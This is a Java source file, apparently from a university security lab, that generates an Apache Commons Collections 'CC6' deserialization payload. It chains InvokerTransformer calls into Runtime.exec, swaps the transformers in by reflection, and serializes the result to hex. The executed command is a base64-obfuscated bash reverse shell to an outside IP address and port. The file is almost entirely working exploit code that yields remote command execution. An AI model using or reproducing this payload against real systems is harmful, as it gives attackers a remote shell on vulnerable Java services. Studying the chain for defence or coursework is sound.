package lab2;

import lab1.Utils;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;


public class CC6 {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(1)
        };

        Transformer[] transformers1 = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime",new Class[0]}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec",new Class[]{String.class}, new String[]{"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84Mi4xNTYuMi4xNjYvNTYxNCAwPiYx}|{base64,-d}|{bash,-i}"}),
                new ConstantTransformer(1)
        };

        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(outMap, "aa");

        Map exp = new HashMap();
        exp.put(tiedMapEntry, "bb");

        outMap.remove("aa");

        Field field = ChainedTransformer.class.getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(transformerChain, transformers1);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);

        objectOutputStream.writeUTF("SJTU");
        objectOutputStream.writeInt(1896);

        objectOutputStream.writeObject(exp);
        objectOutputStream.close();

        byte[] bytes = byteArrayOutputStream.toByteArray();
        byteArrayOutputStream.close();

        System.out.println(Utils.bytesTohexString(bytes));
    }
}
